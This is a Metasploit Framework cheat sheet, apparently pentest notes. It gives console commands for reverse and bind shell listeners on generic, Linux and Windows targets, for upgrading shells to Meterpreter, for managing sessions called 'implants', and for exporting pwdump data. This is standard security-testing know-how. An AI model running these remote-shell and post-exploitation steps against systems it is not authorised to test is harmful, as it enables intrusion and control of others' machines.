---
author(s):
  - Userware
tags:
  - metasploit-framework
  - command-and-control
  - living-off-the-land
---
# Metasploit

> [!NOTE]
>  You can use regular one-liners or create your own custom regular payloads. So use it more often. Further more, you can use the [[Resource|meta shell's]] `resource` to automate commands in a faster pace.

## 01 - Multi Handler

### 1.1 - Setting up a Generic TCP listener

#### 1.1.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload generic/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

#### 1.1.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload generic/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.2 - Setting up a Linux TCP listener

#### 1.2.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

#### 1.2.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload linux/x64/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.3 - Setting up a Windows TCP listener

#### 1.3.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

#### 1.3.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/x64/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

## 02 - List Implants

```
msf > sessions -l
```

List implants with verbose.

```
msf > sessions -v
```

## 03 - Switch Interactive Implants

### 3.1 - Metepreter

```
msf > sessions <session_ID>
```

### 3.2 - Meta Shell

```
sessions <session_ID>
```

## 04 - Upgrade to Meterpreter Session

Another benefit is by converting regular shells to meterpreter whenever in various circumstances that you might need it.

```
msf > use post/multi/manage/shell_to_meterpreter

msf post(multi/manage/shell) > options

msf post(multi/manage/shell) > set technique <powershell | vbs>

msf post(multi/manage/shell) > set payload_override windows/meterpreter/reverse_tcp

msf post(multi/manage/shell) > set platform_override windows

msf post(multi/manage/shell) > set psh_arch_override x64

msf post(multi/manage/shell) > run session=<session_ID>
```

Here's a shorter command.

```
msf > sessions -u <session_ID>
```

## 05 - Workspace

Add new workspace.

```
msf > workspace -a new_workspace
[*] Added workspace: new_workspace
[*] Workspace: new_workspace
```

Rename workspace.

```
msf > workspace -r default renamed_workspace
[*] Renamed workspace 'default' to 'renamed_workspace'
```

List available workspaces.

```
msf > workspace [-l]
default
new_workspace
renamed_workspace
```

Search a specific workspace names.

```
msf > workspace -s <workspace>
```

Delete a specific workspace.

```
msf > workspace -d <workspace>
```

Delete all workspaces.

```
msf > workspace -D <workspace>
```

## 06 - Export Database

```
msf > db_export -f <xml | pwdump> output.<xml | pwdump>
```

^1329b2

## 07 - Detach Implant

> [!INFO]
> This feature works to only HTTP and HTTPS listeners.

```
meterpreter > detach
```

## 08 - Terminate Implant

Terminate current implant.

```
meterpreter > quit

meterpreter > exit
```

Terminate specific implant.

```
msf > session -k <session_ID>
```

Terminate all implants.

```
msf > sessions -K
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - Upgrading shells to Metepreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

### Hacking Articles

- [Hacking Articles: How to Upgrade Command Shell to Meterpreter](https://www.hackingarticles.in/command-shell-to-meterpreter/)

- [Hacking Articles: Metasploit for Pentester Database Workspace](https://www.hackingarticles.in/metasploit-for-pentester-database-workspace/)